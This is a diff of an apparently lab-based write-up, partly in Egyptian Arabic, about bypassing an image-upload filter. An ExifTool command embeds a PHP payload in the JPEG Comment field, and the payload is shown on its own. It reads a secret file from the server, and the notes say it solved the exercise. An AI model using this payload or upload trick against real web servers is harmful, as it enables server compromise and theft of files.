@@ -16,11 +16,11 @@ Password: peter
 
 3. I used ExifTool to embed my PHP payload inside the image metadata:
 
-exiftool -Comment='<?php echo file_get_contents("/home/carlos/secret"); ?>' image.jpg
+"exiftool -Comment='<?php echo file_get_contents("/home/carlos/secret"); ?>' image.jpg "
 
 الباي لود ده ينفع و انا حليت ب ده
 
-<?php echo file_get_contents("/home/carlos/secret"); ?>
+"<?php echo file_get_contents("/home/carlos/secret"); ?>"
 بس هحطو داخل محتوي الصوره نفسو و هبعت هيتبعت بعد كده ادور علي الكود بس وسط الحجات الي متشفره
 
 
